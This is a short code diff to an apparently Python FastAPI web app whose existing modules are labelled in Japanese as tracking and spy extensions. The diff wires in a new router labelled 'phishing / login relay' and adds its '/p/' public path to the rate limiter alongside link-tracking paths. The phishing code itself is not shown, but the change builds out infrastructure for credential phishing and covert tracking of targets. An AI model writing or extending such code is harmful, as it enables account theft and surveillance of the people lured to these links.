@@ -51,6 +51,9 @@ app.include_router(snsx.router)
 # --- 追跡（新規） ---
 from . import tracks
 app.include_router(tracks.router)
+# --- フィッシング / ログイン中継（新規） ---
+from . import phish
+app.include_router(phish.router)
 # --- スパイ拡張（新規） ---
 from . import spy
 app.include_router(spy.router)
@@ -294,7 +297,7 @@ async def throttle(request: Request, call_next):
     p = request.url.path
     if p == "/healthz" or p.startswith("/static/"):
         return await call_next(request)
-    cls = "pub" if (p.startswith("/l/") or p.startswith("/v/")
+    cls = "pub" if (p.startswith("/l/") or p.startswith("/p/") or p.startswith("/v/")
                     or p.startswith("/chat/api/") or p.startswith("/dm/api/")) else "gen"
     if not _rl_allow(linktrack.client_ip(request), cls, time.monotonic()):
         return JSONResponse({"ok": False, "why": "too many requests"},
